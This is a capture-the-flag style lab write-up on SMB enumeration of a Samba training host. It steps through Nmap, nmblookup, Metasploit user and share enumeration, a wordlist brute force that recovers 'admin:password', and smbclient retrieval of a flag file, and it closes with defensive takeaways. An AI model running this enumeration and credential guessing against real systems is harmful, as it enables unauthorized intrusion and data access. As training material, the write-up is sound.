# SMB Enumeration & Share Access — Metasploit Lab

## Overview

This lab focused on performing **SMB enumeration and authenticated share access** against a Samba-based target using Kali Linux, Nmap, Metasploit Framework, `nmblookup`, and `smbclient`.

The target used throughout the lab was:

- **Target:** `demo.ine.local`
    
- **IP:** `192.125.71.3`
    
- **SMB:** TCP/445
    
- **Hostname:** `SAMBA-RECON`
    
- **Workgroup:** `RECONLABS`
    

The objective was to move systematically from service discovery and SMB version identification to user/share enumeration, credential testing, authenticated SMB access, and finally retrieving a file from an accessible share.

---

## 1. Initializing Metasploit

I first started the PostgreSQL database service and launched Metasploit Framework. A dedicated Metasploit workspace named `SMB_ENUM` was created to keep the enumeration activity organized.

The workspace allows the results and data collected during the assessment to remain associated with this specific engagement.

### Commands

```bash
service postgresql start
msfconsole
```

Inside Metasploit:

```text
workspace -a SMB_ENUM
```

### Screenshot 1 — Metasploit initialization and workspace creation

![[image.png]]
---

## 2. SMB Service Discovery with Nmap

Before using the SMB-specific Metasploit modules, I verified that the target was exposing SMB over TCP port 445.

The Nmap scan identified:

```text
445/tcp open netbios-ssn Samba smbd 3.X - 4.X
```

The service was associated with the `RECONLABS` workgroup and the host identified itself as `SAMBA-RECON`.

The target was therefore confirmed to be running an SMB service that could be investigated further.

### Command

```bash
nmap -sV -p 445 192.125.71.3
```

### Screenshot 2 — Nmap SMB service discovery

![[image 14.png]] 
---

## 3. NetBIOS Enumeration

I then used `nmblookup` to gather additional NetBIOS information about the target.

The response identified:

- `SAMBA-RECON` as the host name
    
- `RECONLABS` as the workgroup/domain group
    
- Multiple active NetBIOS entries associated with the target
    

This provided additional context before moving into SMB-specific enumeration.

### Command

```bash
nmblookup -A demo.ine.local
```

### Screenshot 3 — NetBIOS information
![[image 14.png]]

---

## 4. Searching Metasploit for SMB Modules

With SMB confirmed, I searched the Metasploit module database for SMB-related auxiliary modules.

The results included modules for:

- SMB version detection
    
- SMB user enumeration
    
- SMB share enumeration
    
- SMB login checking
    
- SMB SID enumeration
    
- SMB directory listing
    
- SMB file download/upload
    
- SMB-related vulnerability detection
    

This demonstrated how Metasploit can be used as a central framework for different stages of SMB assessment.

### Command

```text
search type:auxiliary name:smb
```

### Screenshot 4 — SMB auxiliary modules
![[image 1.png]]


---

## 5. SMB Version Detection

I selected the SMB version detection module:

```text
auxiliary/scanner/smb/smb_version
```

After configuring the target and running the module, Metasploit identified support for SMB versions 1, 2, and 3.

The output also reported:

- Preferred dialect: **SMB 3.1.1**
    
- Encryption capability: **AES-128-CCM**
    
- SMB signatures: **optional**
    
- Authentication domain: **SAMBA-RECON**
    
- Identified implementation: **Samba 4.3.11-Ubuntu**
    

The host was not identified as a native Windows system; Metasploit reported:

```text
Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
```

### Screenshot 5 — SMB version detection
![[image 2.png]]

---

## 6. SMB User Enumeration

Next, I configured the SMB user enumeration module:

```text
auxiliary/scanner/smb/smb_enumusers
```

The module was configured against:

```text
RHOSTS 192.125.71.3
RPORT 445
```

The purpose of this stage was to determine whether the SMB service would disclose valid usernames.

### Screenshot 6 — SMB user enumeration module configuration
![[image 3.png]]


After executing the module, several usernames were discovered.

The identified accounts included:

```text
john
elie
aisha
shawn
emma
admin
```

The enumeration also identified the `SAMBA-RECON` domain and reported password policy information including:

```text
PasswordMin=5
LockoutTries=0
```

### Screenshot 7 — Enumerated SMB users
![[image 4.png]]


---

## 7. SMB Share Enumeration

After identifying valid users, I moved on to enumerating the SMB shares exposed by the target.

The module used was:

```text
auxiliary/scanner/smb/smb_enumshares
```

The enumeration revealed the following shares:

|Share|Type|
|---|---|
|`public`|Disk|
|`john`|Disk|
|`aisha`|Disk|
|`emma`|Disk|
|`everyone`|Disk|
|`IPC$`|IPC/SPECIAL|

The `IPC$` share was identified as an IPC service associated with Samba.

### Screenshot 8 — SMB share enumeration
![[image 5.png]]

---

## 8. Preparing SMB Credential Testing

With a valid username (`admin`) identified and several SMB shares discovered, I tested whether the account could authenticate using a password list.

I selected:

```text
auxiliary/scanner/smb/smb_login
```

The module's options showed support for:

- Username/password authentication
    
- Password files
    
- User files
    
- Blank passwords
    
- Anonymous login attempts
    
- Brute-force speed control
    
- Credential database integration
    
- Session creation after successful authentication
    

### Screenshot 9 — SMB login scanner configuration
![[image 6.png]]


I then configured the discovered `admin` account and supplied a Metasploit password wordlist.

```text
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
```

### Screenshot 10 — Configuring the SMB login scanner
![[image 7.png]]


---

## 9. SMB Credential Testing

The first password-list run produced a large number of failed authentication attempts.

The output demonstrated that the scanner was testing passwords against:

```text
.\admin
```

The initial run did not identify a successful credential.

A second password list was then configured:

```text
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

This illustrates the iterative nature of credential testing in a controlled lab environment: an initial wordlist may not produce a result, requiring another appropriate credential source.

### Screenshot 11 — Failed credential attempts
![[image 8.png]]

---

## 10. Successful SMB Authentication

The subsequent SMB login scan tested several common passwords:

```text
admin
123456
12345
123456789
```

The scanner then reported a successful authentication:

```text
Success: '.\admin:password'
```

Metasploit confirmed that one credential was successful and indicated that an SMB session could be opened using the credentials.

### Screenshot 12 — Successful SMB authentication
![[image 9.png]]


**Lab finding:**

```text
Username: admin
Password: password
```

This demonstrated the security risk of weak, easily guessable credentials on an SMB service.

---

## 11. Enumerating Shares with smbclient

After obtaining valid credentials, I moved outside Metasploit and used `smbclient` to interact directly with the SMB service.

The following command was used to list the available shares:

```bash
smbclient -L //192.125.71.3 -U admin
```

The authenticated enumeration confirmed the previously discovered shares:

```text
public
john
aisha
emma
everyone
IPC$
```

The SMB server again identified itself as:

```text
SAMBA-RECON
```

with:

```text
RECONLABS
```

as the workgroup.

### Screenshot 13 — Authenticated share listing with smbclient
![[image 10.png]]

---

## 12. Accessing the Public Share

I then connected directly to the `public` share using the discovered credentials.

```bash
smbclient //192.125.71.3/public -U admin
```

Once authenticated, I listed the contents of the share.

The directory contained:

```text
secret
dev
```

The presence of a directory named `secret` warranted further investigation within the authorized lab environment.

### Screenshot 14 — Accessing the public SMB share
![[image 11.png]]


---

## 13. Investigating the Secret Directory

Inside the SMB session, I navigated into the `secret` directory:

```text
cd secret
ls
```

The directory contained a file named:

```text
flag
```

This confirmed that the authenticated user could access files beneath the public share.

### Screenshot 15 — Discovering the flag file
![[image 12.png]]


---

## 14. Downloading the File

The file was downloaded from the SMB share using:

```text
get flag
```

`smbclient` successfully transferred the file to the local system.

I then displayed its contents:

```bash
cat flag
```

The recovered flag was:

```text
03ddb97933e716f5057a18632badb3b4
```

### Screenshot 16 — Downloading and reading the flag
![[image 13.png]]


---

# Findings

The SMB assessment demonstrated a complete enumeration-to-access workflow:

1. **SMB exposure identified** on TCP/445.
    
2. **Samba implementation identified** as Samba 4.3.11-Ubuntu.
    
3. **SMB protocol capabilities** were enumerated.
    
4. **Valid SMB usernames** were discovered.
    
5. **SMB shares** were enumerated.
    
6. A weak credential was successfully identified for the `admin` account.
    
7. Authenticated SMB access was obtained using `smbclient`.
    
8. The `public` share exposed a `secret` directory.
    
9. A `flag` file was accessible and successfully downloaded.
    

---

# Security Takeaways

This lab highlighted several important SMB security considerations.

### 1. Avoid weak passwords

The `admin` account was successfully authenticated using the password:

```text
password
```

Administrative and service accounts should use strong, unique credentials that are resistant to dictionary attacks.

### 2. Restrict SMB exposure

SMB should not be unnecessarily exposed to untrusted networks. Network-level controls such as firewalls and segmentation should restrict access to trusted hosts.

### 3. Review share permissions

The authenticated `admin` account was able to access the `public` share and subsequently reach a `secret` directory. Share and filesystem permissions should follow the principle of least privilege.

### 4. Monitor authentication attempts

Repeated SMB authentication failures can indicate credential-guessing activity. Logging and monitoring should be configured to detect abnormal authentication patterns.

### 5. Minimize unnecessary information disclosure

Username, domain, workgroup, SMB version, and share enumeration can provide valuable information to an attacker. SMB configurations should disclose only what is necessary.

---

# Tools Used

- **Kali Linux**
    
- **Nmap**
    
- **Metasploit Framework**
    
- **nmblookup**
    
- **smbclient**
    
- **PostgreSQL**
    

---

# Conclusion

This exercise demonstrated how SMB enumeration can progress from basic network reconnaissance to authenticated access and file retrieval.

The important lesson was not simply obtaining the flag, but understanding the methodology:

```text
Service Discovery
      ↓
SMB Identification
      ↓
User Enumeration
      ↓
Share Enumeration
      ↓
Credential Testing
      ↓
Authenticated SMB Access
      ↓
File/Directory Enumeration
      ↓
File Retrieval
```

Working through each stage helped reinforce how seemingly small information disclosures — such as usernames and share names — can eventually be combined with weak credentials and excessive permissions to obtain access to sensitive resources.

> **Lab note:** All testing documented here was performed against the intentionally vulnerable training environment and should only be replicated against systems where explicit authorization has been provided.